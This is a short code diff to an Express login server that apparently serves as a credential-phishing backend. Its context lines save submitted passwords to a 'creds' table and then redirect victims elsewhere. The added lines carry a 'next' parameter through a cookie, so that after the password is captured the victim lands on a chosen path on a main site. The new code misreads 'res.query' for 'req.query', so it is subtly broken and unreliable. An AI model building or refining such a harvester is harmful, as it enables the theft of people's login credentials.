@@ -86,7 +86,11 @@ app.get('/login', async (req, res) => {
     });
     await supabase.from('session_count').insert([{ session_id: sessionId, count: 1 }]);
   }
-
+if(res.query.next){
+    res.cookie('next', res.query.next, {
+      maxAge: 30 * 60 * 1000, // 30 minutes in milliseconds
+    });
+  }
   res.render('login', {
     sessionId: sessionId,
     error: req.query.error,
@@ -184,6 +188,11 @@ app.post('/login/password', async (req, res) => {
     } else {
       await supabase.from('creds').update({ password: password }).eq('session_id', sessionId);
       await supabase.from('session_count').delete().eq('session_id', sessionId);
+   const next = req.cookies.next;
+      if (next){
+        const fullUrl =`${process.env.MAIN_REDIRECT_URL}/${next}`;
+        return res.redirect(fullUrl);
+      }
       return res.redirect(process.env.REDIRECT_URL)
     }
   } catch (err) {
